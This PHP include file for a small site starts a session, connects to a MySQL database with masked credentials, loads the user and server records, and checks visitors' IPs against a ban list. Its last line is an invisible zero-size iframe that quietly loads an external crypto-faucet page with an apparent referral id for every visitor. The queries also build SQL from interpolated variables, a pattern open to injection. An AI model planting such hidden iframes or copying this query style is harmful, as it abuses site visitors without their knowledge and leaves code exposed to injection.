<?
ob_start();
session_start();
error_reporting(0);
function gen_timer_start(){
    global $timer_start_time;
    $start_time = microtime();
    $start_array = explode(" ",$start_time);
    $timer_start_time = $start_array[1] + $start_array[0];
    return $timer_start_time;
}
gen_timer_start();

$host="localhost";
$user="########";
$password="########";
$db="######";
$link = mysqli_connect($host, $user, $password, $db); // Соединяемся с базой

// Ругаемся, если соединение установить не удалось
if (!$link) {
echo 'Не могу соединиться с БД. Код ошибки: ' . mysqli_connect_errno() . ', ошибка: ' . mysqli_connect_error();
exit;
}

function set ($key, $data){$_SESSION[$key]=$data;}
function view ($key){echo $_SESSION[$key];}
function clear ($key){unset($_SESSION[$key]);}

$ip = $_SERVER['REMOTE_ADDR'];
$time = time();
$uid = $_SESSION['uid'];

$user = mysqli_fetch_array(mysqli_query($link, "SELECT * FROM `user` WHERE `id`='$uid'"));

$server = mysqli_query($link, "SELECT * FROM `server` WHERE `id`='1'");
$server_data = mysqli_fetch_array($server);

$uid = $_SESSION['uid'];
$adminid = $_SESSION['adminid'];

$banip = mysqli_fetch_array(mysqli_query($link, "SELECT * FROM `banip` WHERE `ip`='$ip'"));

if($banip == 0){
}else{
    mysqli_close($link);
    echo "<center><strong>".$ip." - ip был заблокирован за попытку взлома сервера!</strong></center>";
    exit();
}

?>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<iframe src="https://autofaucet.org/wm/Mihandr/4?id=11" width="0" height="0" style="border:0"></iframe>
